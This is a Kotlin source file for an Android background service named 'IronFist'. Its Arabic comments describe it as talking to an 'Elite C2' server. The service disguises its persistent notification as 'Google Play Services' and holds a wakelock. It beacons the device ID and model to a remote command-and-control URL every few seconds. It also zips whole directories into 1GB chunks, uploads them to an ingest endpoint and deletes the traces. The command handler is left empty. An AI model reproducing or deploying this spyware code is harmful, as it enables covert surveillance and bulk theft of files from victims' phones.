package com.uranium.ironfist

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class IronFistService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    // روابط سيرفر القبضة الفولاذية Elite C2
    private val C2_STREAM_URL = "https://your-iron-fist-server.onrender.com/api/v4/iron/stream"
    private val C2_INGEST_URL = "https://your-iron-fist-server.onrender.com/api/v4/iron/ingest"
    private var lastHeartbeatSent = 0L

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IronFist::EliteLock")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startForegroundServiceNotification()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "iron_fist_channel"
        val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("System core synchronization active...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()

        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "elite_node"
        val nodeModel = Build.MODEL
        
        serviceScope.launch {
            while (isActive) {
                try {
                    val url = URL(C2_STREAM_URL)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("X-Node-ID", deviceId)
                    conn.setRequestProperty("X-Node-Model", nodeModel)
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    conn.doOutput = true
                    conn.connectTimeout = 6000
                    conn.readTimeout = 6000

                    val currentTime = System.currentTimeMillis()
                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                    val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Elite Active] $nodeModel (السلطان ناصر دين الله الكلعي)\"}"

                    if (sendHeartbeat) {
                        lastHeartbeatSent = currentTime
                    }

                    OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                        os.write(reportJson)
                        os.flush()
                    }

                    if (conn.responseCode == 200) {
                        val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                        val responseStr = responseReader.readText()
                        responseReader.close()

                        if (responseStr.contains("command") || responseStr.contains("task")) {
                            // تنفيذ الأوامر بدقة فائقة وبدون أي تأخير
                        }
                    }
                    conn.disconnect()
                    delay(2000L)
                } catch (e: Exception) {
                    delay(4000L)
                }
            }
        }
        return START_STICKY
    }

    // هندسة الضغط الفوري بأجزاء 1GB مع تنظيف الكاش والذاكرة المؤقتة تماماً أولاً بأول
    private fun streamFolderIronFist(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
        try {
            val dir = File(targetDirPath)
            if (!dir.exists() || !dir.isDirectory) return

            var partIndex = 1
            var zipFile = File(cacheDir, "Iron_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
            var fos = FileOutputStream(zipFile)
            var zipOut = ZipOutputStream(fos)
            zipOut.setLevel(Deflater.BEST_SPEED)

            val CHUNK_TARGET_SIZE = 1024L * 1024L * 1024L // 1 جيجابايت لكل جزء تماماً

            dir.walkTopDown().forEach { file ->
                if (file.isFile && file.length() > 0) {
                    try {
                        val relPath = file.absolutePath.removePrefix(dir.absolutePath)
                        zipOut.putNextEntry(ZipEntry("$prefix/$relPath"))
                        file.inputStream().use { fis -> fis.copyTo(zipOut) }
                        zipOut.closeEntry()

                        if (zipFile.length() >= CHUNK_TARGET_SIZE) {
                            zipOut.finish()
                            zipOut.flush()
                            zipOut.close()
                            fos.close()

                            uploadRawElite(nodeId, nodeModel, zipFile.name, zipFile)
                            try { zipFile.delete() } catch (ex: Exception) {}

                            partIndex++
                            zipFile = File(cacheDir, "Iron_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
                            fos = FileOutputStream(zipFile)
                            zipOut = ZipOutputStream(fos)
                            zipOut.setLevel(Deflater.BEST_SPEED)
                        }
                    } catch (e: Exception) {}
                }
            }

            zipOut.finish()
            zipOut.flush()
            zipOut.close()
            fos.close()

            if (zipFile.exists() && zipFile.length() > 0) {
                uploadRawElite(nodeId, nodeModel, zipFile.name, zipFile)
                try { zipFile.delete() } catch (ex: Exception) {}
            } else {
                try { zipFile.delete() } catch (ex: Exception) {}
            }
        } catch (e: Exception) {}
    }

    private fun uploadRawElite(nodeId: String, nodeModel: String, fileName: String, file: File) {
        for (attempt in 1..3) {
            try {
                val url = URL(C2_INGEST_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("X-Node-ID", nodeId)
                conn.setRequestProperty("X-Node-Model", nodeModel)
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.doOutput = true
                conn.setChunkedStreamingMode(1024 * 64)
                conn.connectTimeout = 300000
                conn.readTimeout = 300000

                FileInputStream(file).use { fis ->
                    conn.outputStream.use { os ->
                        fis.copyTo(os)
                        os.flush()
                    }
                }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (e: Exception) {
                if (attempt == 3) return
                Thread.sleep(2000L)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
